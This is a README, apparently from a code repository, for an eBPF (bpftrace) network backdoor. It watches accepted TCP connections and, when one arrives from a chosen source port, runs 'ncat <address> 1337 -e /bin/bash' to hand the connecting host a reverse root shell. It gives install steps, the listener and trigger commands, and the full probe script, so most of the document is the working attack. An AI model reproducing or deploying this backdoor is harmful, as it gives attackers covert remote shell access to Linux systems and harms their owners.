# eBPF Network Backdoor Implementation

A sophisticated implementation of a network backdoor utilizing eBPF technology to monitor TCP connections and establish reverse shells under specific conditions.

## Table of Contents

* [Overview](#overview)
* [Features](#features)
* [Requirements](#requirements)
* [Installation](#installation)
* [Usage](#usage)
* [Technical Details](#technical-details)
* [Security Considerations](#security-considerations)

## Overview

This project demonstrates advanced Linux kernel manipulation techniques using eBPF to create a persistent network monitoring system. The implementation focuses on intercepting TCP accept events and establishing reverse shell connections based on predefined port configurations.

## Features

* Real-time TCP connection monitoring
* Port-specific filtering mechanism
* Automatic reverse shell establishment
* IPv4 protocol support
* System-level integration

## Requirements

* Linux kernel with eBPF support
* Root privileges for installation
* Netcat (ncat) utility
* BCC tools for eBPF compilation

# Install dependencies
sudo apt-get update
sudo apt-get install -y bcc-tools netcat
```

## Usage

### Server Side (Listener)
```bash
nc -l -p 1337 -s 0.0.0.0 -vv
```

### Client Connection
```bash
nc 127.0.0.1 22 -p 9999
```

## Technical Details

The implementation consists of two main components:

1. **Initialization Section**
   ```awk
   BEGIN {
       printf("eBPF Backdoor. Hit Ctrl-C to end.\n");
       printf("Allowed source port: %u\n", $1);
   }
   ```

2. **Connection Monitoring**
   ```awk
   kretprobe:inet_csk_accept {
       $sk = (struct sock *)retval;
       $inet_family = $sk->__sk_common.skc_family;
       
       if ($inet_family != AF_INET) {
           return;
       }
   
       $dport = $sk->__sk_common.skc_dport;
       $src_port = (( $dport >> 8) | (($dport << 8) & 0x00FF00));
   
       if ($src_port != $1) {
           return;
       }
   
       $daddr = ntop($sk->__sk_common.skc_daddr);
       time("%H:%M:%S ");
       printf("Got connection from %s on allowed port\n", $daddr);
       system("ncat %s 1337 -e /bin/bash\n", $daddr);
   }
   ```

## Security Considerations

* This implementation requires root privileges to operate
* The backdoor listens on port 1337 for reverse shell connections
* Only IPv4 connections are monitored
* Port filtering is implemented for security control
* System logs may contain evidence of operation

## License

[MIT License](LICENSE)

![Image](https://github.com/user-attachments/assets/624b7ca1-9ca7-484d-afb3-bcde0d1642aa)
